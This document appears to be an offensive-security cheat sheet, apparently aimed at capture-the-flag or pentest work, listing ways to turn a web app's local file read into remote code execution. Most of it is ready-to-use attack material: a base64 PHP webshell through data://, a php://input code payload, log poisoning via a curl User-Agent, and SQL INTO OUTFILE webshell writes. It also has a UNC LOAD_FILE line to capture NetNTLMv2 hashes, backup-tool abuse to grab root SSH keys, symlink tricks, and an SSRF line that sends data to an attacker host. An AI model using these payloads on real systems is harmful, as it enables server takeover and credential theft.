# Escalating File Read → RCE

Ordered by reliability. Only some apply per situation — read the source to know which.

## 1. The endpoint is `include`/`require` (not `readfile`)
If the param feeds `include "$dir/$page"`, you already have RCE:
```bash
# data:// (allow_url_include) — one-shot webshell
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
# php://input (send code in POST body)
POST /?page=php://input   body: <?php system($_GET['c']);?>
# LFI to write: file_put_contents style endpoints or log poisoning below
```

## 2. Log poisoning (LFI read → PHP include)
Pollute a log the app includes, then include it:
```bash
# Inject PHP into Apache/Nginx access log via User-Agent (or auth failure message)
curl 'http://tgt/' -H 'User-Agent: <?php system($_GET[c]);?>'
# then include the log through the LFI
?page=../../../../var/log/apache2/access.log&c=id
# nginx access/error log, auth log, mail.log, /proc/self/fd/N (tail of active log)
```

## 3. php-filter chain (PHP 7+, file_get_contents only)
Chain `php://filter` + `iconv` + `zlib.deflate` to turn arbitrary file into a `data://`-like payload; complex but reliable for `file_get_contents`-based LFI. Search `php-filter-chains` / `php_filter_chain_generator`.

## 4. Write primitive alongside read (then trigger reload)
```bash
# If app ALSO writes files (upload, export-extension, admin write-file API):
#  - Write webshell into webroot → GET it
#  - Overwrite app source → if dev server auto-reloads (uvicorn --reload, nodemon, pm2):
#    backdoor an endpoint; trigger it
#  - Write into a directory a cron/root script consumes (see credential-reuse-spray
#    and sudo-tool-config-abuse for the privesc half)
```

## 5. Backup/restore tools running as root (file read → SSH key / flag)
```bash
# restic/Backrest GUI: create repo + plan targeting /root → backup now → restore
#   → download tar.gz containing root/.ssh/id_rsa + root.txt
# backy/npbackup with custom config: add /root to paths → --dump/extract
```

## 6. SQLi file primitives (when web read fails)
```sql
-- read
SELECT LOAD_FILE('/etc/passwd');
-- write webshell
SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/sh.php';
-- MySQL SMB capture (Windows): load_file of UNC path → NetNTLMv2
SELECT LOAD_FILE('\\\\10.10.14.5\\test');
```

## 7. Symlink / path manipulation
```bash
# If you can WRITE in a directory the app reads (cart/, product-details/, /tmp):
ln -sf /var/www/private/leave_requests.csv <file-the-app-writes>
# app writes through the symlink into a file a root process consumes (mail hook, cron)
# SUID binary + controlled symlink/input → read arbitrary file with root perms
```

## 8. Special endpoints / wrappers
- `curl` SSRF with multi-URL: `url=http://127.0.0.1/flag http://attacker/` — exfil both
- Grafana-style plugin path traversal → read config/datasource → creds
- CXF MTOM `<xop:Include href="file:///etc/passwd"/>` — Java web service file read
- Spring Boot actuator heapdump → credentials in memory (→ RCE via Eureka/jolokia)

## Checklist before giving up
- Read source to confirm read-vs-include
- Try include path with `data://`, `php://input`, `php://filter` chain
- Log poison + include
- Check for ANY write primitive (upload/export/admin-write) + reload mechanism
- Check cron/root scripts consuming writable files
- Fall back to SSRF/SQLi/backup-tool file-read for the same goal
